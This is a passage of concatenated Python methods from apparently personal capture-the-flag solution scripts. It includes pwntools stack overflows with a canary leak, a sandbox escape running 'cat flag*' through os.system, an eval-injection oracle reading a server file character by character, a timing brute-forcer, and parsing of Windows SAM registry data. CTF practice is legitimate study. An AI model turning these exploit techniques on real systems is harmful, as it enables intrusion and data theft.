                    print(
                        f&#34;Sub-subkey: {sub_subkey.name}, Offset: {sub_subkey._offset}&#34;
                    )

                print(f&#34;Values - {subkey.name}:&#34;)
                for value in subkey.iter_values():
                    print(f&#34;  Value Name: {value.name}, Value Data: {value.value}&#34;)
                for sub_subkey in subkey.iter_subkeys():
                    print(
                        f&#34;Sub-subkey: {sub_subkey.name}, Offset: {sub_subkey._offset}&#34;
                    )

        # Using this to get all the subkeys
        # for i in skew1_key.iter_subkeys():
        #     print(i.name, i.value.)

        # for i in skew1_key.iter_values():
        #     if i.name == &#34;SkewMatrix&#34;:
        #         print(&#34;Found SkewMatrix value:&#34;)
        #         return i.value
        #     print(i.name, i.value)

        # class_name = skew1_key.header.class_name
        # print(f&#34;Class Name: {class_name}&#34;)
        # values = skew1_key.values()
        # print(f&#34;Values: {values}&#34;)

        # print(control_set.read_value())
        # print(control_set.get_class_name())

        # skew1 = self.hive.open(&#34;ControlSet001\\Control\\Lsa\\Skew1&#34;)

        # offset =
        return

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def get_cell_size(self):
        reg = Registry.Registry(self.challenge_file)
        print(self.get_functions(reg, under=False))

        lsa_key = reg.open(r&#34;ControlSet001&#34;)
        print(self.get_functions(lsa_key))

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def recover_skew1_cell_hex(self, cell_size, cell_data):
        &#34;&#34;&#34;
        Recover the Skew1 part of the Windows BootKey as a continuous hex string.

        Args:
            cell_size (int): The size of the registry cell (including size bytes and data).
            cell_data (bytes): The raw bytes of the cell data including the Skew1 Class Name/Attribute.

        Returns:
            str: The continuous hex string in the format ECSC{...}
        &#34;&#34;&#34;
        # Convert cell size to 4 bytes, little-endian
        size_bytes = cell_size.to_bytes(4, byteorder=&#34;little&#34;)
        # Concatenate size and data
        full_cell = size_bytes + cell_data
        # Convert to uppercase hex string
        hex_string = full_cell.hex().upper()
        # Format as flag
        return hex_string

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def main(self):
        # self.get_cell_size()
        result = self.skew_get_value()

        self.attempt_for_loop_subkeys()

        # /home/figaro/CTF/Categories/Forensics/ECSC/Hive_Heist/payloads/solution.py
    def get_functions(self, variable):
        &#34;&#34;&#34;
        Get all functions of a variable
        &#34;&#34;&#34;
        return [
            func
            for func in dir(variable)
            if callable(getattr(variable, func)) and not func.startswith(&#34;__&#34;)
        ]

        # /home/figaro/CTF/Categories/Forensics/ECSC/Hive_Heist/payloads/solution.py
    def hive_solution(self):
        self.hive = RegistryHive(self.challenge_file)
        security_answers = []
        users_base = r&#34;\SAM\Domains\Account\Users&#34;
        users_key = self.hive.get_key(users_base)
        # print(hive)

        # Get all functions of the hive object
        hive_functions = self.get_functions(self.hive)

        # print(&#34;Hive Functions:&#34;, hive_functions)
        users_key_functions = self.get_functions(users_key)

        # Get the name for each user from subkey.name

        user_key = &#34;000003E9&#34;  # print(&#34;Users Key Functions:&#34;, users_key_functions)

        user_subkeys = users_key.get_subkey(user_key)
        # print(&#34;User Subkeys:&#34;, user_subkeys.get_value(&#34;&#34;))

        # value_v = user_subkeys.get_value(&#34;V&#34;)
        value_reset = user_subkeys.get_value(&#34;ResetData&#34;)
        # value_force = user_subkeys.get_value(&#34;ForcePasswordReset&#34;)

        # decoded_value_v = self._decode_v_value(value_v)
        decoded_value_reset = self._decode_v_value(value_reset)
        # decoded_value_force = self._decode_v_value(value_force)

        # print(&#34;Decoded V Value:&#34;, decoded_value_v)
        # print(&#34;Decoded Reset Value:&#34;, decoded_value_reset)
        # print(&#34;Decoded Force Value:&#34;, decoded_value_force)

        # print(decoded_value_reset)

        # Join the list into a single string and parse it as JSON
        decoded_json = json.loads(&#34;&#34;.join(decoded_value_reset))
        flag = f&#34;ECSC{{{&#39;:&#39;.join([item[&#34;answer&#34;] for item in  decoded_json[&#34;questions&#34;]])}}}&#34;
        # answers = [item[&#34;answer&#34;] for item in decoded_value_reset.get()]
        print(flag)

        # /home/figaro/CTF/Categories/Forensics/ECSC/Hive_Heist/payloads/solution.py
    def look_all_subkeys(self):
        # Unused
        security_answers = []
        users_base = r&#34;\SAM\Domains\Account\Users&#34;
        users_key = self.hive.get_key(users_base)

        for subkey in users_key.iter_subkeys():

            # for subkey in users_key.subkeys_list:
            if subkey.name == &#34;Names&#34;:
                continue  # Skip the Names key

            try:

                print(subkey.name, subkey.values_count, list(subkey.iter_values()))
                v_value = subkey.get_value(&#34;V&#34;)
                # print(f&#34;Value for {subkey.name}: {v_value}&#34;)
                decoded = self._decode_v_value(v_value)
                if decoded:
                    security_answers.extend(decoded)
            except Exception as e:
                print(e)
                continue

        print(security_answers)
        # Only keep unique and plausible answers (e.g. non-binary junk)
        cleaned = [a for a in security_answers if a and a.isprintable()]
        cleaned = list(dict.fromkeys(cleaned))  # remove duplicates

        return
        # Format answer according to challenge
        result = f&#34;ECSC{{{&#39;:&#39;.join(cleaned[:3])}}}&#34;
        print(result)
        self.flag = result

        # /home/figaro/CTF/Categories/Forensics/ECSC/Hive_Heist/payloads/solution.py
    def _decode_v_value(self, value_bytes):
        try:
            # Decode as UTF-16LE (standard for registry)
            text = value_bytes.decode(&#34;utf-16le&#34;, errors=&#34;ignore&#34;)
            # Extract readable strings
            candidates = re.findall(r&#34;[\x20-\x7e]{3,}&#34;, text)
            # print(candidates)
            return candidates

            def is_valid(s):
                if len(s) &gt; 30 or len(s) &lt; 3:
                    return False
                if re.fullmatch(r&#34;[0-9a-fA-F]{6,}&#34;, s):  # ignore hashes
                    return False
                if sum(c.isalpha() for c in s) &lt; 2:
                    return False
                return True

            return [c for c in candidates if is_valid(c)]

        except Exception as e:
            print(f&#34;Decoding error: {e}&#34;)
            return []

        # /home/figaro/CTF/Categories/Forensics/ECSC/Hive_Heist/payloads/solution.py
    def main(self):
        self.hive_solution()

        # /home/figaro/CTF/Categories/Pwn/HTB/El_Pipo/payloads/solution.py
    def custom_init(self):
        self.folder_files = self.Path(self.folder_files, &#34;challenge&#34;)
        self.library = self.Path(self.folder_files, &#34;glibc&#34;)
        self.challenge_file = self.Path(self.folder_files, self.file)

        self.pwn.context.binary = self.Path(self.challenge_file)

        self.env = {&#34;LD_PRELOAD&#34;: self.library.as_posix()}

        # /home/figaro/CTF/Categories/Pwn/HTB/El_Pipo/payloads/solution.py
    def connect(self, *args, **kwargs) -&gt; None:
        # return super().initiate_connection()
        self.conn = self.pwn.process(self.challenge_file.as_posix(), env=self.env)

        # /home/figaro/CTF/Categories/Pwn/HTB/El_Pipo/payloads/solution.py
    def main(self):
        self.custom_init()
        self.initiate_connection()

        # self.recv_menu(display=True)
        payload = &#34;a&#34; * 31

        # self.send_menu(payload, display=True)

        self.conn.sendline(payload.encode())

        # /home/figaro/CTF/Categories/Pwn/HTB/Reconstruction/payloads/solution.py
    def __init__(self, conn, file, url, port):
        super().__init__(conn=conn, file=file, url=url, port=port)

        self.pwn.context.binary = self.binary = self.pwn.ELF(
            self.challenge_file, checksec=True
        )

        self.libc_path = self.Path(self.folder_files, &#34;glibc&#34;, &#34;libc.so.6&#34;)
        self.ld_path = self.Path(self.folder_files, &#34;glibc&#34;, &#34;ld-linux-x86-64.so.2&#34;)

        self.env = {&#34;LD_PRELOAD&#34;: str(self.libc_path), &#34;LD&#34;: str(self.ld_path)}

        # /home/figaro/CTF/Categories/Pwn/HTB/Reconstruction/payloads/solution.py
    def connect(self, *args, **kwargs) -&gt; None:
        if self.conn_type == &#34;remote&#34; and self.url and self.port:
            self.conn = self.pwn.remote(self.url, self.port)
        elif self.conn_type == &#34;local&#34; and self.file:
            self.conn = self.pwn.process(
                [str(self.ld_path), str(self.challenge_file)], env=self.env
            )

        # /home/figaro/CTF/Categories/Pwn/HTB/Reconstruction/payloads/solution.py
    def interacting_with_binary(self):

        self.initiate_connection()

        initial_menu = &#34;[*] Initializing components...\n&#34;

        # self.recv_menu(number=10, display=True)
        output = self.conn.recvuntil(initial_menu)
        print(output)

        # /home/figaro/CTF/Categories/Pwn/HTB/Reconstruction/payloads/solution.py
    def main(self):

        self.interacting_with_binary()

        # /home/figaro/CTF/Categories/Pwn/HTB/Quack_Quack/payloads/solution.py
    def main(self):
        self.initiate_connection()

        menu_text = &#34;&gt; &#34;
        payload = &#34;Quack Quack &#34;
        payload += &#34;%p. &#34; * 40
        print(payload)
        self.recv_send(text_until=menu_text, text=payload, lines=34)

        result = self.recv_lines(number=4, display=True, save=True)

        # This is not yet complete, but it is a good start
        canary = result[0].split(&#34;.&#34;)[1]
        canary = int(canary, 16)
        print(f&#34;Canary: {hex(canary)}&#34;)
        # Step 2: Craft Overflow Payload
        payload = b&#34;A&#34; * 32  # Fill `buf`
        payload += self.pwn.p64(canary)  # Bypass stack canary
        payload += b&#34;B&#34; * 8  # Overwrite saved RBP
        payload += p64(
            0xDEADBEEF
        )

        # /home/figaro/CTF/Categories/Pwn/ECSC/Log_Recorder/payloads/solution.py
    def setup(self):
        self.elf = self.pwn.context.binary = self.pwn.ELF(self.challenge_file)
        self.pwn.context.terminal = [&#34;tmux&#34;, &#34;splitw&#34;, &#34;-h&#34;]

        # /home/figaro/CTF/Categories/Pwn/ECSC/Log_Recorder/payloads/solution.py
    def get_elf_function_address(self, function):
        &#34;&#34;&#34;
        Description:
        &#34;&#34;&#34;
        if self.elf is None:
            self.elf = self.pwn.ELF(self.challenge_file)

        return self.elf.symbols[function]

        # /home/figaro/CTF/Categories/Pwn/ECSC/Log_Recorder/payloads/solution.py
    def challenge_get_offset_address(self, function1, function2):
        offset = self.get_elf_function_address(
            function1
        ) - self.get_elf_function_address(function2)
        return offset

        # /home/figaro/CTF/Categories/Pwn/ECSC/Log_Recorder/payloads/solution.py
    def main(self):
        # self.elf = None
        self.setup()
        self.initiate_connection()
        # main_offset = self.challenge_get_offset_address(&#34;main&#34;, &#34;emergency_broadcast&#34;)
        emergency_broadcast_addr = self.get_elf_function_address(&#34;emergency_broadcast&#34;)
        print(f&#34;Emergency Broadcast Address: {hex(emergency_broadcast_addr)}&#34;)
        payload1 = b&#34;A&#34; * 8
        print(payload1)
        payload2 = b&#34;B&#34; * 0x18 + self.pwn.p64(emergency_broadcast_addr)
        print(payload2)

        # self.recv_lines(2, display=True)
        log_entry_text = &#34;Enter log entry: &#34;
        # self.recv_until(log_entry_text)
        # self.send(payload1)
        self.recv_send(text_until=log_entry_text, lines=2, text=payload1, display=True)

        data_entry_text = &#34;Enter data: &#34;
        # print(self.recv_until(data_entry_text))
        # self.send(payload2)
        self.recv_send(text_until=data_entry_text, text=payload2, display=True)

        # time.sleep(0.5)
        # self.recv_lines(2, display=True)

        self.conn.interactive()

        # /home/figaro/CTF/Categories/Pwn/ECSC/Log_Recorder/payloads/attempt_01.py
    def get_elf_function_address(self, function):
        &#34;&#34;&#34;
        Description:
        &#34;&#34;&#34;
        if self.elf is None:
            self.elf = self.pwn.ELF(self.challenge_file)

        return self.elf.symbols[function]

        # /home/figaro/CTF/Categories/Pwn/ECSC/Log_Recorder/payloads/attempt_01.py
    def challenge_get_offset_address(self, function1, function2):
        offset = self.get_elf_function_address(
            function1
        ) - self.get_elf_function_address(function2)
        return offset

        # /home/figaro/CTF/Categories/Pwn/ECSC/Log_Recorder/payloads/attempt_01.py
    def main(self):
        self.initiate_connection()
        self.elf = None
        # main_offset = self.challenge_get_offset_address(&#34;main&#34;, &#34;emergency_broadcast&#34;)
        emergency_broadcast_addr = self.get_elf_function_address(&#34;emergency_broadcast&#34;)
        payload1 = b&#34;A&#34; * 24
        # + b&#34;\x91&#34;
        print(payload1)
        payload2 = b&#34;B&#34; * 24 + self.pwn.p64(emergency_broadcast_addr)
        print(payload2)
        self.recv_lines(2)
        log_entry_text = &#34;Enter log entry: &#34;
        self.recv_until(log_entry_text)
        self.send(payload1)
        data_entry_text = &#34;Enter data: &#34;
        self.recv_until(data_entry_text)
        self.send(payload2)
        self.conn.interactive()

        # /home/figaro/CTF/Categories/Miscellaneous/Reply/Flagsembler/payloads/solution.py
    def main(self):
        pass

        # /home/figaro/CTF/Categories/Miscellaneous/plaidctf/Hangman/payloads/solution.py
    def main(self):
        pass

        # /home/figaro/CTF/Categories/Miscellaneous/CSCG/It-Admin/payloads/solution.py
    def rot_bruteforce(self, crypted_text, known_text, max_shift=94):
        &#34;&#34;&#34;
        Brute forces ROT47 shifts to find the one that contains the known text.

        Args:
            crypted_text (str): The encrypted text.
            known_text (str): The known plaintext to look for.
            max_shift (int): The maximum shift to attempt (ROT47 has 94 shifts).

        Returns:
            int: The shift that contains the known text, or -1 if not found.
        &#34;&#34;&#34;
        for shift in range(1, max_shift):
            decrypted_text = self.rot(crypted_text, shift)
            if known_text.lower() in decrypted_text.lower():
                return shift
        return -1

        # /home/figaro/CTF/Categories/Miscellaneous/CSCG/It-Admin/payloads/solution.py
    def rot(self, text, shift):
        &#34;&#34;&#34;
        Applies the ROT47 cipher to the given text with the specified shift.

        Args:
            text (str): The input text.
            shift (int): The ROT47 shift amount.

        Returns:
            str: The transformed text.
        &#34;&#34;&#34;
        return &#34;&#34;.join([self.rot_char(c, shift) for c in text])

        # /home/figaro/CTF/Categories/Miscellaneous/CSCG/It-Admin/payloads/solution.py
    def rot_char(self, c, shift):
        &#34;&#34;&#34;
        Rotates a single character using the ROT47 cipher.

        Args:
            c (str): The input character.
            shift (int): The ROT47 shift amount.

        Returns:
            str: The rotated character.
        &#34;&#34;&#34;
        ascii_code = ord(c)
        if 33 &lt;= ascii_code &lt;= 126:  # ROT47 only affects printable ASCII
            return chr((ascii_code - 33 + shift) % 94 + 33)
        return c

        # /home/figaro/CTF/Categories/Miscellaneous/CSCG/It-Admin/payloads/solution.py
    def main(self):
        hexing = &#34;6a0077002d0032002c0054003d006400420071004e004700250053002800680064004f007800490046002000780044004c00710058002600530038006e004f003b004c0022002400670064002100500060005d0055003d006c0027003000290069002e004d002500660071004c005400710077006e0037005600330031003a003e006d004d0033006d0070006c003c005600500034003b0045003d003d007a0071005f004c0067006d004a005b0049002e00410056002b0076003d0060007a004b002c005b007a005f002000380039005e006d00230074005e002200680040002d006e0079002e00370066002e005300&#34;
        result = &#34;&#34;
        for i in range(0, len(hexing), 2):
            # print(hexing[i : i + 2])
            if hexing[i : i + 2] == &#34;00&#34;:
                result += &#34; &#34;
            else:
                result += hexing[i : i + 2]
        print(result)

        decoded = bytes.fromhex(hexing).decode(&#34;utf-16&#34;)
        print(decoded)
        partial = &#34;}&#34;
        shift = self.rot_bruteforce(decoded, partial)
        print(f&#34;Shift: {shift}&#34;)
        print(f&#34;Decoded: {self.rot(decoded, shift)}&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/NTUA/Challenge_Idea/payloads/solution.py
    def main(self):
        selections = [
            &#34;3_0&#34;,
            &#34;1_2&#34;,
            &#34;3_2&#34;,
            &#34;1_1&#34;,
            &#34;5_0&#34;,
            &#34;0_0&#34;,
            &#34;2_0&#34;,
            &#34;1_0&#34;,
            &#34;3_1&#34;,
            &#34;5_2&#34;,
            &#34;5_1&#34;,
            &#34;6_0&#34;,
            &#34;6_1&#34;,
            &#34;3_3&#34;,
            &#34;2_1&#34;,
            &#34;2_2&#34;,
            &#34;0_1&#34;,
        ]
        seldir = {
            0: {0: 123, 1: 125},
            1: {0: 80, 1: 67, 2: 72},
            2: {0: 80, 1: 101, 2: 82},
            3: {0: 78, 1: 84, 2: 52, 3: 84},
            5: {0: 75, 1: 109, 2: 88},
            6: {0: 52, 1: 53},
        }

        flag = &#34;&#34;
        for s in selections:
            nums = [int(i) for i in s.split(&#34;_&#34;)]
            flag += chr(seldir[nums[0]][nums[1]])
        print(flag)

        # /home/figaro/CTF/Categories/Miscellaneous/NTUA/Challenge_Idea/payloads/solution.py
    def verify_js_reconstructed(self):
        self.challenge_file = self.Path(self.folder_data, &#34;chall_edited.pptx&#34;)
        self.try_catch(self.run)

        # /home/figaro/CTF/Categories/Miscellaneous/NTUA/Challenge_Idea/payloads/verify.py
    def main(self):
        self.challenge_file = self.Path(self.folder_data, &#34;chall_edited.pptx&#34;)
        self.try_catch(self.run)

        # /home/figaro/CTF/Categories/Miscellaneous/NTUA/Challenge_Idea/payloads/verify.py
    def run(self):
        selections = [
            &#34;3_0&#34;,
            &#34;1_2&#34;,
            &#34;3_2&#34;,
            &#34;1_1&#34;,
            &#34;5_0&#34;,
            &#34;0_0&#34;,
            &#34;2_0&#34;,
            &#34;1_0&#34;,
            &#34;3_1&#34;,
            &#34;5_2&#34;,
            &#34;5_1&#34;,
            &#34;6_0&#34;,
            &#34;6_1&#34;,
            &#34;3_3&#34;,
            &#34;2_1&#34;,
            &#34;2_2&#34;,
            &#34;0_1&#34;,
        ]

        prs = Presentation(self.challenge_file)
        correct = True

        for selection in selections:
            slide_index = int(selection[0])
            shape_index = 1 if selection[0] != &#34;0&#34; else 0
            text_index = int(selection[2])

            slide = prs.slides[slide_index]
            shape = slide.shapes[shape_index]
            text = shape.text

            if slide_index == 0:
                if text_index == 0 and text[0] != chr(123):
                    correct = False
                elif text_index == 1 and text[23] != chr(125):
                    correct = False
            elif slide_index == 1:
                if text_index == 0 and text[41] != chr(80):
                    correct = False
                elif text_index == 1 and text[138] != chr(67):
                    correct = False
                elif text_index == 2 and text[184] != chr(72):
                    correct = False
            elif slide_index == 2:
                if text_index == 0 and text[0] != chr(80):
                    correct = False
                elif text_index == 1 and text[83] != chr(101):
                    correct = False
                elif text_index == 2 and text[179] != chr(82):
                    correct = False
            elif slide_index == 3:
                if text_index == 0 and text[25] != chr(78):
                    correct = False
                elif text_index == 1 and text[26] != chr(84):
                    correct = False
                elif text_index == 2 and text[28] != chr(52):
                    correct = False
                elif text_index == 3 and text[84] != chr(84):
                    correct = False
            elif slide_index == 5:
                if text_index == 0 and text[105] != chr(75):
                    correct = False
                elif text_index == 1 and text[106] != chr(109):
                    correct = False
                elif text_index == 2 and text[219] != chr(88):
                    correct = False
            elif slide_index == 6:
                if text_index == 0 and text[52] != chr(52):
                    correct = False
                elif text_index == 1 and text[95] != chr(53):
                    correct = False

        if correct:
            print(&#34;Thanx for helping me out, now go input the flag&#34;)
        else:
            print(&#34;I don&#39;t think i had that in mind&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/NTUA/Challenge_Idea/payloads/verify.py
    def try_catch(self, callback):
        try:
            callback()
        except Exception as error:
            print(error)

        # /home/figaro/CTF/Categories/Miscellaneous/NTUA/Snekbox/payloads/solution.py
    def main(self):
        self.challenge_file = self.folfil(&#34;data&#34;, &#34;edited_server.py&#34;)
        self.initiate_connection()
        self.menu_text = &#34;&gt; &#34;
        self.menu_num = 0

        payload = &#39;globals().get(&#34;unsafe&#34; + globals()[&#34;BLACKLIST&#34;][6] + globals()[&#34;BLACKLIST&#34;][9])()&#39;
        self.send_menu(choice=payload)

        payload = &#34;&#34;&#34;__import__(&#39;os&#39;).system(&#34;cat flag*&#34;)&#34;&#34;&#34;
        # payload = &#34;&#34;&#34;print(&#34;THis is working &#34; )&#34;&#34;&#34;
        self.send_menu(choice=payload)
        self.recv_lines(number=1, display=True)

        # /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def main(self):
        # self.initiate_connection()
        # self.exploitation()
        self.flouri_min = self.random_flouri_generator(number=1)
        self.flouri_max = self.random_flouri_generator(number=10**30)

        # self.recv_menu(number=2, save=True)
        # self.send_menu()

        self.brute_force()

        # /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def test_letter(self, password):
        alphabet = string.ascii_letters + string.digits + string.punctuation

        results = []

        for i in alphabet:
            connector = CTFSolver(
                conn=self.conn_type, file=self.file, url=self.url, port=self.port
            )

            connector.menu_text = &#34;Give me password and number in json: &#34;
            connector.menu_num = 0

            connector.initiate_connection()
            connector.recv_lines(number=2, display=False)
            start_time = time.time()
            connector.send_menu(
                self.payload_maker(password + i, self.flouri_min), display=False
            )
            response = connector.recv_lines(number=1, save=True)

            connector.conn.close()

            end_time = time.time()

            results.append((i, end_time - start_time))

        results = sorted(results, key=lambda x: x[1])

        return results

        # /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def brute_force(self):
        password = &#34;&#34;
        for _ in range(60):
            results = self.test_letter(password)
            print(results)
            password += results[0][0]
            print(password)

        # /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def random_flouri_generator(self, number=None):
        m = 10**30

        if number:
            return (
                number**11
                + 17 * number**7
                - 42 * number**5
                + 1337 * number * 3
                + 31337 * number
            )

        return (
            random.randint(1, m) ** 11
            + 17 * random.randint(1, m) ** 7
            - 42 * random.randint(1, m) ** 5
            + 1337 * random.randint(1, m) * 3
            + 31337 * random.randint(1, m)
        )

        # /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def check_password_time(self, length):
        start_time = time.time()
        for i in range(length):
            for _ in range(10000):
                pass
            return time.time() - start_time
        return time.time() - start_time

        # /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def exploitation(self):
        self.recv_lines(number=2)

        self.menu_text = &#34;Give me password and number in json: &#34;

        self.menu_num = 1

        # /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def length_find(self):

        lenghter = CTFSolver(
            conn=self.conn_type, file=self.file, url=self.url, port=self.port
        )
        for i in range(10, 130):
            time_reference = self.check_password_time(i)

            print(time_reference)

            lenghter.initiate_connection()
            lenghter.recv_lines(number=2)
            lenghter.menu_num = 0
            menu_text = &#34;Give me password and number in json: &#34;
            payload = self.payload_maker(&#34;NH4CK{&#34; + &#34;a&#34; * i, self.flouri_min + i)

            start_time = time.time()
            # lenghter.recv_lines(number=2, display=True)
            lenghter.send_menu(payload, menu_text=menu_text, display=True)

            print(&#34;Trying length: &#34;, i)
            response = lenghter.recv_lines(number=1, display=True, save=True)
            stop_time = time.time()

            duration = stop_time - start_time

            if b&#34;GLYKO and HUGS&#34; in response[0]:
                print(&#34;length found&#34;, i)
                print(response[0])
                # return i

            if b&#34;sweet AND lucky&#34; in response[0]:
                print(&#34;Found the correct length&#34;)
                print(&#34;Duration: &#34;, duration)
                print(&#34;Response: &#34;, response[0])
                print(&#34;Payload: &#34;, payload)
                print(&#34;Flouri: &#34;, self.flouri_min + i)
                sys.exit(0)
                return i

            if b&#34;Something wrong honey?&#34; in response[0]:
                return i

            print(f&#34;Duration: {duration}&#34;)
            print(f&#34;Time Reference: {time_reference}&#34;)
            if duration &gt; time_reference:
                print(&#34;Length found: &#34;, i)
                return i

        # /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def payload_maker(self, password, number):
        payload = {&#34;password&#34;: password, &#34;number&#34;: number}
        return json.dumps(payload)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/CalculAltor/payloads/solution.py
    def main(self):
        self.real_url = f&#34;http://{self.url}:{self.port}&#34;
        self.url_path = f&#34;{self.real_url}/calculate&#34;
        # self.sending_request()
        self.preparing_dictionary()
        self.get_flag_length()
        self.flag = &#34;ECSC{&#34;
        self.bruteforcer()

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/CalculAltor/payloads/solution.py
    def sending_request(self, exploit=None, verbose=False):

        # payload = &#34;```python\nwith open(&#39;/app/flag.txt&#39;) as f:\n result = f.read()\nprint(result)\n```&#34;

        headers = {
            &#34;Content-Type&#34;: &#34;application/json&#34;,
            &#34;Origin&#34;: self.real_url,
            &#34;Referer&#34;: f&#34;{self.real_url}/&#34;,
            &#34;User-Agent&#34;: &#34;Mozilla/5.0 (X11; Linux x86_64)&#34;,
            &#34;Accept&#34;: &#34;*/*&#34;,
        }
        payload = {&#34;equation&#34;: exploit}

        response = requests.post(self.url_path, headers=headers, json=payload)
        if verbose:
            print(&#34;[+] Status:&#34;, response.status_code)
            print(&#34;[+] Response:&#34;, response.text)
            print(response.json())
        return response.json()

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/CalculAltor/payloads/solution.py
    def get_flag_length(self):
        exploit = &#34;0+len(open(&#39;/app/flag.txt&#39;).read())&#34;
        response = self.sending_request(exploit=exploit, verbose=False)
        if response and &#34;result&#34; in response:
            try:
                self.flag_length = int(response[&#34;result&#34;])
                print(f&#34;[+] Flag length: {self.flag_length}&#34;)
            except ValueError:
                print(&#34;[-] Failed to parse flag length.&#34;)
        else:
            print(&#34;[-] No valid response received.&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/CalculAltor/payloads/solution.py
    def exploit_development(self, i, letter):
        # variable = &#34;+&#34;.join([ord(l) * 1000 * i for i, l in enumerate(&#34;ECSC{TEST}&#34;)])
        # print(variable)
        exploit = f&#34;0+(1 if open(&#39;/app/flag.txt&#39;).read()[{i}]==&#39;{letter}&#39; else 0)&#34;
        return exploit

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/CalculAltor/payloads/solution.py
    def preparing_dictionary(self):
        &#34;&#34;&#34;
        This method is not used in the current solution.
        It can be implemented if needed for future enhancements.
        &#34;&#34;&#34;
        additional = {
            &#34;e&#34;: 3,
            &#34;a&#34;: 4,
            &#34;i&#34;: 1,
            &#34;o&#34;: 0,
            &#34;s&#34;: 5,
            &#34;t&#34;: 7,
            &#34;g&#34;: 9,
        }
        self.dictionary = &#34;_-{}&#34;
        for i in range(len(ascii_uppercase)):
            if ascii_lowercase[i] in additional:
                self.dictionary += str(additional[ascii_lowercase[i]])
            self.dictionary += ascii_uppercase[i] + ascii_lowercase[i]
        self.dictionary += digits + punctuation

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/CalculAltor/payloads/solution.py
    def bruteforcer(self):
        for i in range(len(self.flag), self.flag_length):
            for letter in self.dictionary:
                exploit = self.exploit_development(i, letter)
                # print(f&#34;[+] Trying: {exploit}&#34;)
                response = self.sending_request(exploit=exploit)
                if response and &#34;result&#34; in response:
                    try:
                        result = int(response[&#34;result&#34;])
                        if result == 1:
                            print(
                                f&#34;[+] Found character at position {i}: {letter}. Flag so far: {self.flag + letter}&#34;
                            )
                            self.flag += letter
                            break
                        else:
                            print(f&#34;[-] Character at position {i} is not: {letter}&#34;)
                    except ValueError:
                        print(&#34;[-] Failed to parse response.&#34;)
                else:
                    print(&#34;[-] No valid response received.&#34;)

        print(f&#34;[+] Final flag: {self.flag}&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/CalculAltor/payloads/solution.py
    def validate_flag(self):
        for i, letter in enumerate(self.flag):
            exploit = self.exploit_development(i, letter)
            print(f&#34;[+] Trying: {letter}&#34;)
            response = self.sending_request(exploit=exploit)
            if response and &#34;result&#34; in response:
                try:
                    result = int(response[&#34;result&#34;])
                    if result == 0:
                        print(f&#34;[-] Flag is invalid at position {i}: {letter}&#34;)
                        return False
                except ValueError:
                    print(&#34;[-] Failed to parse response.&#34;)
                    return False
            else:
                print(&#34;[-] No valid response received.&#34;)
                return False
        print(&#34;[+] Flag is valid!&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/InitialChallenge/payloads/solution.py
    def main(self):
        image = self.folfil(&#34;files&#34;, &#34;qo91ni.jpg&#34;)
        img = Image.open(image)
        r, g, b = img.split()
        r_lsb = np.array(r) &amp; 1
        g_lsb = np.array(g) &amp; 1
        b_lsb = np.array(b) &amp; 1
        combined = (r_lsb &lt;&lt; 2) | (g_lsb &lt;&lt; 1) | b_lsb
        Image.fromarray((combined * 32).astype(np.uint8)).show()

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/music21_solution.py
    def bruteforcing_failed(self):
        self.KEY = [
            7,
            58,
            391,
            58,
            129,
            80,
            537,
            80,
            389,
            33,
            80,
            107,
            522,
            391,
            389,
            148,
            386,
            522,
            389,
            58,
            240,
            240,
            107,
            1,
        ]
        flag = []
        all_letters = ascii_letters + punctuation
        for i in self.KEY:
            # flag += chr(self.KEY[i] ^ ord(variables[i % len(variables)]))
            flag.append(all_letters[(i) % len(all_letters)])
        self.flag = &#34;&#34;.join(flag)
        print(self.flag)
        # print(ascii_letters)
        print(all_letters)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/music21_solution.py
    def main(self):

        # self.bruteforcing_failed()
        # return
        self.music21_analysis()

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/music21_solution.py
    def music21_analysis(self):
        # midi_file_path = &#34;/mnt/data/flag.midi&#34;
        self.midi = converter.parse(self.challenge_file)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/music21_solution.py
    def music21_note_analysis(self):
        # Analyze structure and extract textual representation
        notes_data = []
        for element in self.midi.flatten():
            # print(element)
            notes_data.append(str(element))
            # if isinstance(element, note.Note):
            #     notes_data.append(str(element.pitch))
            # elif isinstance(element, chord.Chord):
            #     notes_data.append(&#34;.&#34;.join(str(n) for n in element.normalOrder))

        return

        analysis = []

        for i, element in enumerate(notes_data):
            split_element = element.split(&#34; &#34;)
            if &#34;.&#34; in split_element[0]:
                analysis.append(
                    {
                        &#34;sort&#34;: i,
                        &#34;type&#34;: split_element[0].split(&#34;.&#34;)[1],
                        &#34;value&#34;: &#34; &#34;.join(split_element[1:]),
                    }
                )
            else:
                analysis.append({&#34;sort&#34;: i, &#34;type&#34;: &#34;generic&#34;, &#34;value&#34;: element})

        with open(self.folfil(&#34;data&#34;, &#34;analysis_music_21.json&#34;), &#34;w&#34;) as f:
            import json

